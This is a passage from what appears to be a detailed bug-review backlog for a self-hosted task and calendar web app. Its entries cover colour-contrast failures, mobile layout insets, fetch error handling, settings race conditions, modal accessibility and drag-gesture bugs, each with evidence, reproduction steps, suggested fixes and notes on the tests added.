fails AA for normal text (4.5:1) and also fails the 3:1 minimum for large text and for
non-text UI components — and it is used not only for captions but for interactive
controls. The dark theme is 2.75:1, also failing. The sibling token --fg-muted is fine
(4.76 light / 6.27 dark), so this is specifically --fg-faint.

<details><summary>Evidence</summary>

```
tokens.css:13   --fg-faint: rgba(20, 19, 26, 0.36);   /* over --bg #FBFAF7 */
tokens.css:73   --fg-faint: rgba(236, 234, 242, 0.34); /* dark, over --bg #0C0C10 */

Computed (sRGB compositing + WCAG 2.x relative luminance):
  light  --fg-faint on --bg      = 2.30:1   (rgb 168,167,167 on 251,250,247)
  light  --fg-faint on --bg-elev = 2.32:1
  light  --fg-faint on --paper   = 2.28:1
  dark   --fg-faint on --bg      = 2.75:1
  workspace-light                = 2.33:1 ; workspace-dark = 3.16:1

Text at body size wearing it: .empty (14px, "Nothing here yet."),
.agenda-empty (14px, "Nothing this day."), .arch-empty (14px), .col-empty (13px),
.hintline (12px — the settings explanations), .dash-empty (13px).
INTERACTIVE controls wearing it (3:1 minimum, and their only affordance is the
colour): .cal-more ("+N more", app.css:574), .today-more (1635),
.side-item .side-edit (126), .group-btn (214), .group-eye (205),
.chip-x (tokens.css:243), .today-drop / .today-plus (1590),
.today-est.unset (1565), .cal-tasks-done (233).
Also .cal-dow (490) — the seven weekday headers of the month grid.

Failure scenario: on a phone outdoors, or on any screen at less than full
brightness, "Nothing this day." under the mobile calendar agenda and the
"+N more" control on a busy cell are not legible; a low-vision user cannot read
the settings hintlines at all.
```

</details>

**Suggested fix.** Raise the alpha so the composited value clears 4.5:1 for the text uses (light needs
roughly rgba(20,19,26,0.58); dark roughly rgba(236,234,242,0.55)), or split the token:
keep a very light --fg-faint strictly for hairline decoration and move every
text/control use onto --fg-muted, which already passes. Mirror the change in the preset
blocks (tokens.css:105, 134) and in appearance.ts's PRESETS copies, which
appearance.test.ts asserts must not drift.

#### [x] The Home tab's module stack silently drops the mobile safe-area bottom padding, so the last module sits under the home indicator
`frontend/src/styles/app.css:1158` · **medium** · rendering · minor

The mobile block gives the app's scroller a home-indicator inset: `.scroll { padding-
bottom: calc(40px + env(safe-area-inset-bottom)) }` (line 867). HomeView's phone branch
renders `<div className="scroll dash-stack">`, and `.dash-stack` (line 1158) sets the
`padding` SHORTHAND at the same (0,1,0) specificity but 291 lines later, so it wins and
resets all four sides: bottom becomes a flat 12px with no env() term. Home is the only
tab whose scroller loses the inset — Tasks, Today and Scheduling use a bare `.scroll`,
and the Calendar tab has its own `.day-agenda { padding-bottom: calc(24px + env(safe-
area-inset-bottom)) }`.

<details><summary>Evidence</summary>

```
app.css:867  (inside @media (max-width: 720px))
  .scroll { padding-bottom: calc(40px + env(safe-area-inset-bottom)); }
app.css:1158 (outside any media query, later in the file)
  .dash-stack { display: flex; flex-direction: column; gap: 12px; padding: 12px 14px; }

HomeView.tsx:214
  <div className="scroll dash-stack">
    {ordered.map((m) => ( <section className="dash-mod"> … ))}

index.html:5 opts the page into the unsafe area:
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />

Failure scenario (iPhone 14, 390x844, safe-area-inset-bottom = 34px):
  `.shell` is height:100dvh, so `.scroll.dash-stack`'s bottom edge is the physical
  screen bottom. Home tab, scroll to the end: the last module's final 22px sit
  under the home-indicator pill, and there is no further scroll available to lift
  them clear. If that module is "Upcoming" or "Quick add", its last row/its input
  is the thing under the indicator, where a tap competes with the system
  home-swipe gesture.
```

</details>

**Suggested fix.** Either drop the shorthand (`.dash-stack { … padding: 12px 14px; }` -> set `padding: 12px
14px` on top/sides and leave bottom to `.scroll`), or add the inset back inside the
mobile block: `@media (max-width: 720px) { .dash-stack { padding-bottom: calc(12px +
env(safe-area-inset-bottom)); } }`.

#### [x] One failing task list blanks the whole account's tasks — every pane then says "Nothing to do here." with no retry
`frontend/src/data.tsx:217` · **medium** · bug · stage 4

TaskProvider fans the task fetch out with `Promise.all`, so a single list that answers
500/502/429/404 rejects the whole batch. `setTasks` is never called, `loaded` is still
flipped to true in the `.finally`, and the guard raises one generic toast that does not
name the list. Every task surface in the app (TasksView, HomeView, TodayView, the
calendar's task overlay) reads this one array, so all of them go empty — or, worse, keep
painting the stale rows seeded from the disk mirror as if they were live. The calendar
path immediately below (data.tsx:711) was explicitly rewritten to `Promise.allSettled` +
per-calendar `windowErrors` for exactly this failure shape; the task path was never
given the same treatment, and there is no `reload`/retry affordance on the tasks side at
all. The effect only re-runs on `loadKey` / `rev` / `enabled` / `listsLoaded`, and `rev`
only moves when the server publishes a data change — so on an idle account the empty
pane is permanent until a full page reload.

<details><summary>Evidence</summary>

```
data.tsx:214-222:
```
const token = ++fetchToken.current
const key = loadKey
guard(async () => {
  const per = await Promise.all(lists.map((l) => api.tasks(l.id)))
  const ts = per.filter(Array.isArray).flat()
  if (token === fetchToken.current && key === keyRef.current) setTasks(ts)
}).finally(() => setLoaded(true))
```
Reproduced against the real provider (vitest, jsdom): `api.lists` -> [{id:'good'},{id:'poison'}]; `api.tasks('good')` -> two tasks; `api.tasks('poison')` -> `HttpError(500,'internal error')`. Result: `loaded === 'true'`, rendered tasks === `NONE`, one toast `'internal error'`. Both of the healthy list's tasks are gone. TasksView.tsx:519-520 then renders `{loaded ? 'Nothing to do here.' : 'Loading…'}` for every list — the owner is told their account is empty. A poison VTODO written by jtx Board/Tasks.org that 500s the DTO builder for one collection (a documented failure class in this repo) is enough to trigger it.
```

</details>

**Suggested fix.** Use `Promise.allSettled` like `fetchWindow` does: keep the lists that answered, flatten
those, and expose the failed list NAMES on the context (a `taskListErrors` analogue of
`windowErrors`) so TasksView can render "Couldn't load Shared" with a retry instead of
"Nothing to do here.". Only leave the data untouched when every list failed, and expose
a `reloadTasks()` so the retry is reachable without a page reload.

**Pinned by** `2026-08-25 — one task list that will not load > still shows the lists that answered` in `frontend/src/backlog.aug25.stage4.test.tsx`.

**Fixed** with the suggested fix, taken from the calendar path next door rather than invented: `Promise.allSettled`, keep what answered, record the failed list NAMES on the context as `taskListErrors` (the `windowErrors` analogue), and expose `reloadTasks()` so the retry is reachable without a page reload. `TasksView` renders the same `.cal-partial` banner the month grid uses, and the empty state is suppressed while it is up — otherwise the pane says "Couldn't load Shared" and "Nothing to do here." at the same time, which is worse than either alone.

**Three things the pin explicitly does not require, and all three needed tests.** The pin takes "a list that answered still shows its tasks" and says so — "a fix that only made the failure visible would still have thrown the healthy list's rows away". The converse also holds: keeping the rows is necessary and not sufficient.

* **The failure is NAMED and retryable.** A mutation that kept the rows and never set `taskListErrors` passes the pin.
* **A TOTAL failure keeps what is on screen.** `setTasks` runs only when something landed, which is the calendar path's own lesson ("a worse blank than the one this finding is about, because the rows to draw were sitting on disk"). This is invisible on a cold load — there is nothing to lose yet — so the test loads healthy rows first and then fails a refetch driven by `rev`.
* **An AuthError is the SESSION, not one list.** `allSettled` swallows every rejection by construction, so without re-throwing it an expired session reads as a set of broken lists and the app never routes to the login card. Same guard, same comment, as the calendar fan-out.

**`reloadTasks` needed a signal of its own.** The effect keys on `loadKey`/`rev`/`enabled`/`listsLoaded`, and `rev` only moves when the SERVER publishes a change — so on an idle account a failed fetch had no way back at all. A `taskNonce` in the deps is what makes the button do anything; without it a mutation leaves a Retry that re-runs nothing and still passes every other assertion.

#### [x] The calendar's disk mirror is wiped on every cold boot: the logout-clear effect also fires on mount while auth is still 'loading'
`frontend/src/data.tsx:775` · **medium** · rendering · minor · stage 4

`CalendarProvider` seeds `cals` from `readCachedCalendars()` so the first frame has
content, then an effect clears everything whenever `enabled` is false. `enabled` is
`auth === 'in'`, and `auth` starts at `'loading'` — so the effect runs on MOUNT, before
`/api/me` has answered, and `setCals([])` throws the seed away along with
`seeded.current` and `latest.current`. The effect was added to fix logout leakage (the
`enabled` true->false transition); it does not distinguish that from the initial false.
The result is that the entire calendar half of cache.ts is dead code in practice: on
every cold load the Calendar tab mounts with zero calendars, `requestWindow(from, to,
[])` returns early because `!forCals.length`, and the events request is serialised
behind `/api/me` -> `/api/calendars` -> `/api/calendars/{id}/events`. On a phone over a
slow link that is a blank month and an empty calendar sidebar for two full round trips,
which is precisely the waterfall cache.ts's header says it exists to remove.
TaskProvider has no such effect, so lists/tasks DO paint from cache — the two halves of
the same provider now behave differently.

<details><summary>Evidence</summary>

```
data.tsx:775-786:
```
useEffect(() => {
  if (enabled) return
  setCals([])
  setWindows(new Map())
  ...
  seeded.current = null
  latest.current = ''
}, [enabled])
```
against data.tsx:651 `const [cals, setCals] = useState<List[]>(() => readCachedCalendars() ?? [])` and App.tsx:626 `<DataProvider ... enabled={auth === 'in'}>` with `auth` initialised to `'loading'` (App.tsx:37).

Reproduced (vitest, jsdom): write one calendar and one list to the mirror, render `<DataProvider rev={0} enabled={false}>` (exactly what App renders while `/api/me` is in flight). After mount the probe reads `lists === 'Inbox'` (cached list survives) but `cals === 'NONE'` — the cached calendar has been cleared. Flipping `enabled` to true with `api.calendars` still pending leaves it `NONE`.
```

</details>

**Suggested fix.** Only clear on the true->false TRANSITION, e.g. keep a `wasEnabled` ref (or run the clear
from a `useRef<boolean>` initialised to `enabled`) and skip the first invocation, so a
mount with `enabled === false` leaves the seeded cache alone.

**Pinned by** `2026-08-25 — the disk mirror on a cold boot > survives a mount that happens before /api/me has answered` in `frontend/src/backlog.aug25.stage4.test.tsx`.

**Fixed** with the suggested fix: a `wasEnabled` ref, and the clear runs only on the true→false STEP. `enabled` is `auth === 'in'` and `auth` starts at `'loading'`, so the effect fired on mount — before `/api/me` had answered — and threw away the `readCachedCalendars()` seed set two lines above it in the same constructor. The effect was written for logout leakage, which is a transition, and it did not distinguish that from the initial false.

**One mutation turned out to be an EQUIVALENT implementation, not a wrong one**, and the comment was corrected rather than a test invented for it. Seeding the ref with `false` instead of with `enabled` behaves identically, because the guard is the STEP (`was && !now`) and no first invocation can be a fall either way. The original comment claimed the seed was load-bearing; it is not, and saying so would have misled the next reader into preserving something that does not matter. Seeding with `enabled` stays because it states the intent.

The two that ARE wrong are both caught: clearing on any false is the defect itself, and never clearing at all leaks the previous session's calendars into the next login — which is what this effect was added for, and what its control asserts.

#### [x] Boot treats "can't reach the server" as "signed out": a network drop or a 502 on /api/me hands the owner a login card and hides their cached data
`frontend/src/App.tsx:160` · **medium** · bug · stage 4

The boot handler is `api.me().then(...).catch(() => setAuth('out'))`. `j()` only
produces `AuthError` for a 401 — a dropped connection rejects with a `TypeError` and a
5xx with `HttpError` — and all three land in the same catch, so any transport failure
renders `<Login>`. This is the exact inversion of the rule the SSE loop in the same
codebase states and enforces ("A server that is down is not a session that is gone, and
signing a live session out on one 502 from the tunnel would be a worse bug than the one
this fixes", api.ts:791-796) and of the write path's own policy (App.tsx:354-357
deliberately stays quiet for a request that never reached a server). Setting
`auth='out'` also flips `enabled` to false, which makes `CalendarProvider` clear its
state, so the last-known-good data the disk mirror was built to show is unreachable from
the login card. There is also no timeout on this request: if the socket is half-open
(very common when a phone resumes from background across a wifi/cellular switch) the app
sits on a topbar over a completely empty `<div className="content" aria-busy>` — no
spinner, no text, no retry — for as long as the browser's network timeout, because every
view is gated on `!booting`.

<details><summary>Evidence</summary>

```
App.tsx:152-161:
```
sweepOldVersions()
api.me()
  .then((m) => { setCacheUser(m.user); setUser(m.user); setAuth('in') })
  .catch(() => setAuth('out'))
```
against api.ts:604-608, where only `res.status === 401` throws `AuthError`.

Scenario: owner opens the PWA on a phone with a flaky connection. `fetch('/api/me')` rejects with `TypeError: Failed to fetch`. The app shows the sign-in card; the owner types their password; `POST /api/login` also fails and the card shows a raw transport message. Their session cookie is still perfectly valid and their tasks are sitting in localStorage — neither is reachable until the network returns AND they reload. App.test.tsx:56 currently pins this behaviour with `m.me.mockRejectedValue(new Error('unauthenticated'))`, i.e. the test cannot tell the two cases apart either.
```

</details>

**Suggested fix.** Branch on the error: `AuthError` -> `setAuth('out')`; anything else -> stay in a third
state that keeps the shell and the cached data on screen with an "offline / can't reach
the server" banner and a retry button (and re-probe `api.me()` on
`online`/`visibilitychange`). Add an AbortController timeout so a half-open socket
surfaces as that state instead of an indefinitely blank pane.

**Pinned by** `2026-08-25 — booting with the server unreachable > does not hand the owner a sign-in card` in `frontend/src/backlog.aug25.stage4.test.tsx`.

**Fixed** with the suggested fix, whole. `Auth` gains a fourth value, `'offline'`; boot branches (`e instanceof AuthError ? 'out' : 'offline'`); the shell stays up with an `.offline-bar` saying it is showing what was last saved on this device and that the session is still valid, plus a Retry; and `online` / `visibilitychange` re-probe while offline so a laptop that wakes up is signed in before its owner looks at it. `api.me` gained an `AbortSignal` and boot a 15 s deadline.

**The pin requires none of that** — it takes "a third state, a retry, a banner over the cached shell" and asserts only that a 502 is not a sign-out. Each part is therefore a mutation it cannot see, and all four have tests: a state with no banner is silently short; a Retry not in the effect's deps re-runs nothing; no `online` listener leaves a woken laptop stuck; and no timeout leaves a half-open socket — a captive portal, a tunnel that accepted the connection and went away — as an indefinitely blank pane, which is this finding wearing a different hat.

**`'offline'` composes with the two fixes above it.** `enabled` stays `auth === 'in'`, so nothing fetches while offline — and the disk-mirror fix in the same stage is what makes that survivable, since the clear now runs only on a true→false STEP and a boot that never reached `'in'` is not one. Without that fix this state would show an empty shell, which is the thing it exists to avoid.

**One deliberate test edit, which the pin itself predicted and named.** `App.test.tsx:56` pinned the OLD conflation with `m.me.mockRejectedValue(new Error('unauthenticated'))` — a bare Error, neither an `AuthError` nor a 401 — so it could not tell the two cases apart either. It now rejects with a real `AuthError`. What it asserts is unchanged; only the failure it simulates is now the one it always claimed to be.

#### [x] A slow GET /api/settings lands after the user has already changed a preference and silently reverts it, leaving the UI disagreeing with the account
`frontend/src/App.tsx:193` · **medium** · bug

The settings read applies its whole payload unconditionally when it resolves. The gear
button becomes clickable the instant `/api/me` returns (`booting` is `auth ===
'loading'`), which is the same commit that issues `api.getSettings()`, so the entire
read RTT is a window in which the user can change a preference. The author was aware of
this class and guarded exactly one field — `tabTouched` for the tab — leaving roughly
twenty other setters (`setTimeFormat`, `setTheme`/`applyTheme`, `setSessionTtl`,
`setHiddenLists`, `setTaskGroups`, `setDashboard`, `setCalFit`, `setShowCompleted`,
`setHomeTz`, …) to clobber whatever the user just chose. The window is not theoretical:
`get_settings` takes the backend's single global service lock, which is also held across
CalDAV round trips during a sync sweep, so `/api/settings` can block for seconds while
the shell is fully interactive.

<details><summary>Evidence</summary>

```
App.tsx:190-234 (abridged):
```
api.getSettings().then((s) => {
  if (s.theme === 'dark' || s.theme === 'light') applyTheme(s.theme)
  ...
  if (!tabTouched.current) { ... }          // <- the one field that is guarded
  ...
  if (isTimeFormat(s.time_format)) setTimeFormat(s.time_format)
```
Reproduced (vitest, jsdom, real `<App>` with only ./api mocked): hold `api.getSettings()` unresolved, open Settings > General, click "12- or 24-hour clock". UI shows `24-hour` and `putSettings` is called with `{time_format:'24h'}` (the write lands). Then resolve the read with `{time_format:'12h'}` — the account's value from before the click. After a flush the row reads `12-hour`. The server holds 24h, the screen says 12h, and nothing tells the user; the next click cycles from the wrong value. With a 4-value cycle (`session_ttl_s`) or an array preference (`hidden_lists`, `task_groups`) the follow-up gesture then writes the merged-wrong array back.
```

</details>

**Suggested fix.** Give the read the same staleness discipline the task/event fetches already have: stamp
it with a token bumped by every `saveSettings`/`saveSettingsSoon` call and skip the
whole apply when the stamp is stale, or (cheaper) apply only the keys not present in a
`touched` set built by the change callbacks — the generalisation of `tabTouched`.

**Fixed** by the second option, keyed on WHEN rather than on whether. `saveSettings`
and `saveSettingsSoon` append their patch's keys to a `writeLog` ref at the GESTURE (not
400ms later when the debounced PUT goes out — a slider drag that starts inside a slow
read's flight has already changed what the user is looking at). The read snapshots the
log's length as it is ISSUED and reads the tail when it answers, so `keep(k)` holds back
exactly the keys changed during that request's flight. A read issued afterwards — every
`settings_updated` refetch, which now also waits for this tab's own PUT to land — carries
the newer truth and is applied in full, so another device's change still reaches a tab
that has touched the same preference.

All 23 keys the read applies are guarded, `day_capacity_minutes` and
`day_capacity_by_weekday` explicitly because they are the only setters here that run
unconditionally — stripping those keys from the payload would have applied `undefined`
rather than skipping them. Three tests: the finding's own reproduction, a control
asserting an untouched preference still lands (a `keep` that held back the whole payload
would lose the account's settings on every boot), and a structural one asserting every
`s.<key>` in the effect is inside a `keep(` — because `tabTouched` guarded one field out
of twenty-three for exactly the reason a per-field guard always does.

#### [x] A failed GET /api/mcp/connections renders "Nothing is connected." — the account's only view of live OAuth grants lies
`frontend/src/components/ConnectionsSection.tsx:27` · **medium** · bug · minor

ConnectionsSection sets `loaded` in a `.finally()` but has no `failed` state, so a
rejected fetch lands in the exact same render as a genuinely empty account: "Nothing is
connected. Applications you connect through the MCP endpoint appear here." This is the
only place in the app that shows which applications hold a live MCP OAuth grant (read or
read+write on the whole account), and the only place a grant can be revoked. The sibling
section ten lines away in the settings panel — ArchivedCalendarsSection — carries an
explicit `failed` flag for precisely this reason, with the comment "'No archived
calendars.' over a failed fetch is a confident lie about the account." This one never
got it.

<details><summary>Evidence</summary>

```
const [loaded, setLoaded] = useState(false)
useEffect(() => {
  guard(async () => { setRows(await api.mcpConnections()); setLoaded(true) })
    .finally(() => setLoaded(true))
}, [])
...
{!loaded ? (<div className="empty">Loading…</div>)
 : rows.length === 0 ? (<div className="empty">Nothing is connected. …</div>)

`makeGuard` swallows the rejection and returns undefined, so `setRows` never runs and `rows` stays []. Reproduced (vitest, jsdom): mcpConnections rejects with HttpError(502) -> `.empty` textContent === "Nothing is connected. Applications you connect through the MCP endpoint appear here."

Scenario: the owner opens Settings → Account to check what still has access after rotating a password. Radicale/tasksd is mid-restart, the request 502s, and the panel states that nothing is connected — while a Claude/DAVx5 grant with mcp:write on every task and calendar is still live for the rest of its 30-day window. The transient error toast is the only contradiction, and it disappears.
```

</details>

**Suggested fix.** Mirror ArchivedCalendarsSection exactly: add `const [failed, setFailed] =
useState(false)`, set it in a `.catch(() => setFailed(true))` (and when the payload is
not an array), and render a third branch — "Couldn't load your connected applications."
— between the loading and empty branches.

#### [x] The sidebar's list/calendar edit modal is the last dialog with no Escape, no dialog role, and a click-to-close scrim over a form
`frontend/src/components/Sidebar.tsx:686` · **medium** · bug

`EditModal` — the only place a list or calendar is renamed, recoloured, regrouped,
archived or deleted, and the ONLY route to any of those on a phone — never adopted
`useEscape`, has no `role="dialog"`/`aria-modal`, and closes on a bare `onClick` on the
scrim. All three are defects the codebase has already fixed elsewhere (TaskModal,
AddMultipleModal, AppearancePanel, DayPopover, PlanRitual, ShutdownRitual,
SchedulingView, SettingsMenu all call `useEscape`; AppearancePanel uses `onMouseDown`
with a target check precisely so a text drag-select released outside does not dismiss).
The modal-contract test in backlog.aug19.stage4b.test.tsx enumerates dialogs by grepping
components for `useEscape(`, so a dialog that never adopted the hook is invisible to the
very test written to stop this being forgotten.

<details><summary>Evidence</summary>

```
return (
  <div className="overlay" onClick={onClose}>
    <div className="modal" onClick={(e) => e.stopPropagation()}>
      <div className="modal-head">…

No useEscape, no role="dialog". Reproduced (vitest, jsdom): render <Sidebar items={[list]} …>, click "Edit Work", dispatch keydown {key:'Escape'} at window -> `.modal` is still in the DOM; `document.querySelector('[role="dialog"]')` is null.

Scenario A (keyboard): open the edit modal, press Escape — nothing happens; the only way out is the ✕ or a scrim click.
Scenario B (drag-select): select the list name text in the Name field and release the mouse a few pixels outside the 520px modal. The `click` event targets `.overlay`, so `onClose` fires and the half-typed rename is discarded — the identical defect already fixed for TaskModal's scrim.
Scenario C (AT): the dialog is announced as a plain group; nothing tells a screen-reader user a modal opened.
```

</details>

**Suggested fix.** Add `useEscape(onClose)` to EditModal, give the inner div `role="dialog" aria-
modal="true" aria-label={placeholder}`, and swap the scrim's `onClick` for
`onMouseDown={(e) => { if (e.target === e.currentTarget) onClose() }}` as
AppearancePanel does. Do the same for the mobile `.drawer-overlay` at Sidebar.tsx:398.
Then widen the stage4b contract test so its membership comes from components rendering
`.overlay`/`role="dialog"`, not from callers of `useEscape`.

#### [x] A double Enter in the sidebar's add form creates two identical lists/calendars on Radicale
`frontend/src/components/Sidebar.tsx:107` · **medium** · bug · minor

`create` awaits `api.create` before calling `setAdding(false)`, and `AddForm` keeps its
input mounted, focused and holding the typed name for the whole round trip with no in-
flight guard. A second Enter while the first POST is still open fires a second
`api.create` with the same name. Each one is a real MKCALENDAR/MKCOL against Radicale,
so the account ends up with two indistinguishable collections that every other CalDAV
client (Tasks.org, jtx, Thunderbird) also sees, and deleting the wrong one is a separate
destructive step. This is the same class as the already-fixed booking-link double-submit
("a double-click (or a second Enter) on 'Create link' publishes two live booking links")
— it just was never applied here.

<details><summary>Evidence</summary>

```
const create = async (name: string, color: string | null) => {
  const l = await api.create(name, color)      // no guard, no disable
  setAdding(false)
  if (l) { onItems([...items, l]); if (canSelect) onSelect?.(l.id) }
}

// AddForm — fires on every Enter, value never cleared
onKeyDown={(e) => { if (e.key === 'Enter' && name.trim()) onCreate(name.trim(), color) …}}

Reproduced (vitest, jsdom): click the sidebar '+', type "Groceries", fire two keyDown Enter events -> `api.create` called 2 times with ("Groceries", null).

Scenario: on a slow or cold self-hosted server the first Enter changes nothing on screen (the form stays open with the text still in it), so pressing Enter again is the natural response — and produces two "Groceries" lists.
```

</details>

**Suggested fix.** Add a busy ref/state in `create` (`if (busy.current) return; busy.current = true` …
`finally { busy.current = false }`) and pass it to AddForm so the input is disabled
while the request is open, matching the in-flight guard the booking-link editor now
carries.

#### [x] A cancelled pointer gesture COMMITS the half-finished dashboard drag instead of discarding it
`frontend/src/components/HomeView.tsx:265` · **medium** · bug · stage 3

`onPointerCancel={endDrag}` and `endDrag` commits: `if (preview) commit(preview)`. A
`pointercancel` means the gesture was aborted by the platform, not completed, so the
module is written to wherever the pointer happened to be when the browser took over —
and `commit` calls `onLayoutChange`, which App persists with
`saveSettingsSoon({dashboard})`. The comment above the sibling effect says a cancelled
gesture "must not leave the layout stuck in preview", which is what the author intended;
committing satisfies the letter and inverts the meaning. This is not theoretical on
touch: nothing in app.css sets `touch-action` anywhere (`grep -n touch-action
src/styles/app.css` -> no matches), and `e.preventDefault()` on pointerdown does not
suppress a browser pan. Arrange mode is gated on `useIsMobile` (max-width: 720px), so
every touch device wider than that — an iPad in landscape at 1180px, a Surface, a
touchscreen laptop — gets Arrange mode with drags the browser will steal for a scroll of
the enclosing `.scroll` container, firing pointercancel every time.

<details><summary>Evidence</summary>

```
const endDrag = () => {
  if (!drag.current) return
  drag.current = null
  if (preview) commit(preview)      // <-- commits an ABORTED gesture
  else setPreview(null)
}
…
<div ref={gridRef} className={`dash-grid …`}
  onPointerMove={onPointerMove} onPointerUp={endDrag} onPointerCancel={endDrag}>

Reproduced (vitest, jsdom), layout [{id:'a',x:0,y:0,w:4,h:6},{id:'b',kind:'overdue',x:4,y:0,w:4,h:5}], grid clientWidth 1200: pointerDown on b's header at (500,20), pointerMove to (700,200), then pointerCancel ->
onLayoutChange called once with [{id:'a',…x:0},{id:'b',…,"x":6,"y":0,"w":4,"h":5}] — b moved from column 4 to column 6 and was saved.

Scenario: iPad landscape, Home tab, tap Arrange, press a module header and drag downward to reorder. The browser pans `.scroll` instead, fires pointercancel, and the module is committed two columns over from where it started — an arrangement the user never released the finger on, written to /api/settings.
```

</details>

**Suggested fix.** Split the handlers: `onPointerUp={endDrag}` commits; `onPointerCancel={() => {
drag.current = null; setPreview(null) }}` discards. Additionally add `touch-action:
none` to `.dash-grid.arranging .dash-mod-head` and `.dash-grip` so the drag is not
stolen on a touch device wide enough to get the desktop canvas.

**Pinned by** `2026-08-25 — an aborted dashboard drag > discards a gesture the platform cancelled` in `frontend/src/backlog.aug25.stage3.test.tsx`.

**Fixed** in both halves the entry names. `onPointerCancel` now runs its own `cancelDrag` — clear the drag, drop the preview, persist nothing — and `onPointerUp` keeps `endDrag`. A release is an instruction; a cancel is the platform taking the gesture over, and there is no position the user chose.

**`cancelDrag` also un-paints, and that needed its own test.** Clearing `drag.current` alone satisfies the pin — nothing reaches `onLayoutChange` — while leaving the module drawn two columns over until Arrange mode is left, which on screen is indistinguishable from a move that took. That is exactly what the sibling effect's comment ("must not leave the layout stuck in preview") forbids, and it was a mutation that passed the pin until `un-paints a gesture the platform cancelled` was added.

**`touch-action: none` on the handles is the other half**, scoped to `.dash-grid.arranging` so a finger still scrolls a module the owner is only reading. There was no `touch-action` anywhere in `app.css` before this.

**The CSS assertions strip comments first, and did not at first.** The prose above the new rule names both selectors and says "scoped to `.arranging`", so matching against the raw file made every assertion true of the COMMENT: a mutation that dropped the scoping and covered `.dash-mod` entirely passed. Stripping `/* … */` before matching catches it, and the control — every `touch-action: none` in the file must be on a drag handle — catches the opposite over-correction.

#### [x] Primary touch targets across Settings and the Home mini calendar are half the 44px minimum, with no mobile override
`frontend/src/styles/app.css:89` · **medium** · rendering · minor

Three of the most-used controls in this subsystem are sized for a mouse and have no rule
inside the `@media (max-width: 720px)` block that enlarges them, even though the app is
described as used heavily on a phone. (1) `.menu-toggle` is every settings control on
the phone sheet — Clock, Theme, Home timezone, Calendar window, Completed tasks, Stay
signed in. `font-size: calc(11px * var(--fs-scale)); padding: 6px 11px` plus a 1px
border ≈ 27px tall. Nothing in the mobile block touches it. (2) `.mini-day`
(app.css:1138) is the Home mini calendar's day cell — a real button that opens the day
popover. `padding: 4px 0; font-size: calc(11px * …)` ≈ 21px tall; in the mobile stack
the grid width is 390 − 28 (`.dash-stack` padding) − 20 (`.mini-cal` padding) ≈ 340px
over 7 columns ≈ 48px wide. 48x21. (3) `.side.drawer .group-btn { padding: 6px 7px;
font-size: 15px }` ≈ 23x30, with `.group-actions { gap: 1px }` — the rename and delete-
group controls, one pixel apart.

<details><summary>Evidence</summary>

```
.menu-toggle {
  font-family: var(--mono); font-size: calc(11px * var(--fs-scale)); …
  background: none; color: var(--fg-muted); border: 1px solid var(--rule);
  padding: 6px 11px; cursor: pointer; …
}
.mini-day {
  text-align: center; padding: 4px 0; font-family: var(--mono);
  font-size: calc(11px * var(--fs-scale)); …
}

`grep -n "menu-toggle\|mini-day" src/styles/app.css` shows no occurrence inside any `@media (max-width: 720px)` block — the mobile block styles `.set-nav-item` to a comfortable `padding: 14px 4px` but leaves the controls the nav leads to at desktop size.

Scenario: iPhone 390x844, Settings → General. "12-hour / 24-hour" is a 27px-tall strip in a row whose label is 11px mono; tapping it reliably takes two attempts. Home tab, mini calendar module: tapping the 24th to see its events lands on the 17th or the 31st because the cells are 21px tall.
```

</details>

**Suggested fix.** Inside the existing `@media (max-width: 720px)` block add `min-height: 44px` (or
padding) for `.menu-toggle`, `.mini-day { padding: 11px 0 }`, and a 44px minimum for
`.side.drawer .group-btn` / `.group-caret`, widening `.group-actions` gap to at least
6px on touch.

#### [x] --fg-faint carries real text at 2.3:1 (light) and 2.8:1 (dark), and dimmed mini-calendar dates land near 1.5:1
`frontend/src/styles/app.css:1144` · **medium** · rendering

`--fg-faint` is the sole colour on text that carries information, and it fails WCAG AA
in both shipped themes. Light: `rgba(20,19,26,0.36)` over `--bg #FBFAF7` composites to
rgb(168,167,168); relative luminance 0.3915 vs 0.9563 -> contrast 2.28:1. Dark:
`rgba(236,234,242,0.34)` over `#0C0C10` composites to rgb(88,88,93); 0.0985 vs 0.0037 ->
2.76:1. AA needs 4.5:1 for the sizes involved (11-13px). It is used for `.hintline`
(app.css:95) — every explanatory paragraph in Settings, Appearance and Connections;
`.dash-empty` (1114) — the entire content of an empty Home module; `.side-item .count`;
and `.mb-summary`, the mobile sidebar bar's "3 of 5 shown", which on a phone is the only
indication that any collection is hidden. Worse, `.mini-day.dim` stacks `opacity: .5` on
top of it. Effective alpha 0.36 x 0.5 = 0.18 -> rgb(209,209,210) on #FBFAF7 -> luminance
0.6376 vs 0.9563 -> 1.46:1. Those are the adjacent-month day numbers in the Home mini
calendar's six-week grid, i.e. up to 11 of the 42 dates rendered.

<details><summary>Evidence</summary>

```
.mini-day.dim { color: var(--fg-faint); opacity: 0.5; }
.hintline { font-size: calc(12px * var(--fs-scale)); color: var(--fg-faint); line-height: 1.4; }
.dash-empty { padding: 14px 12px; color: var(--fg-faint); font-size: calc(13px * var(--fs-scale)); margin: 0; }

// tokens mirrored in appearance.ts DEFAULTS
light['--fg-faint'] = 'rgba(20, 19, 26, 0.36)'   over '--bg': '#FBFAF7'
dark ['--fg-faint'] = 'rgba(236, 234, 242, 0.34)' over '--bg': '#0C0C10'

Contrast computed by sRGB compositing + WCAG relative luminance (values above).

Scenario: light theme, outdoors on a phone. The Home mini calendar's leading and trailing dates are at 1.46:1 — effectively invisible, so the grid reads as starting mid-week. In Settings, the hintline that explains what "Fixed" vs "Dynamic" calendar window means, and the one warning that "a shorter sign-in applies at once, on this device and any other", are at 2.28:1.
```

</details>

**Suggested fix.** Raise `--fg-faint` to at least 0.55 alpha in light (rgba(20,19,26,0.55) ≈ 4.6:1) and
0.55 in dark, and drop the extra `opacity: .5` on `.mini-day.dim` in favour of using
`--fg-muted` there. appearance.test.ts already parses tokens.css and pins DEFAULTS
against it, so both copies move together; consider adding a contrast assertion to that
same test so the token cannot drift back.

#### [x] Test gap: ConnectionsSection — the only UI that revokes an MCP OAuth grant — has no behavioural test at all
`frontend/src/components/ConnectionsSection.tsx:34` · **medium** · test-gap

There is no ConnectionsSection.test.tsx, and grepping the suite shows the component is
only ever reached incidentally: three files call
`m.mcpConnections.mockResolvedValue([])` purely to keep the settings panel from
throwing. Nothing asserts on the disconnect flow, the two-tap confirm, the optimistic
removal and its rollback, the scope-to-words mapping, the granted-at formatting, or the
loading/error states. `grep -rn "mcpDisconnect|Nothing is connected|Disconnect" src
--include=*.test.tsx` returns nothing. This is the surface that ends an OAuth grant with
`mcp:write` over every task and calendar on the account — exactly the kind of security-
